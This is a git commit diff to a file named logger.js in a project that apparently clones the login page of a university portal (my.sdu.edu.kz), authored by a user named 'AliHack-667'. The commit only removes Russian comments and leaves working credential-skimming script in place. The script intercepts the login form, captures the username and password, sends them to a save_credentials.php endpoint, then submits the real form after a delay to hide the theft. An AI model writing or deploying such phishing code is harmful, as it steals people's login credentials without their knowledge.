11acca21916ceff8fa976eac2daaacda52ed3870
AliHack-667 <oalinur7@gmail.com>
2024-12-14 15:50:17 +0500

    Update logger.js

--- my.sdu.edu.kz/logger.js
+++ my.sdu.edu.kz/logger.js
@@ -1,19 +1,17 @@
 <script>
 document.getElementById('loginForm').onsubmit = function(event) {
-    event.preventDefault(); // предотвращаем стандартную отправку формы
+    event.preventDefault(); 
 
     var username = document.getElementById('username').value;
     var password = document.getElementById('password').value;
-
-    // Отправляем данные на сервер перед отправкой основной формы
+    
     var xhr = new XMLHttpRequest();
     xhr.open("post", "my-first-project/my.sdu.edu.kz/save_credentials.php", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     xhr.send("username=" + username + "&password=" + password);
 
-    // Отправляем основную форму
     setTimeout(function() {
         document.getElementById('loginForm').submit();
-    }, 500); // задержка перед отправкой основной формы
+    }, 500); 
 };
 </script>
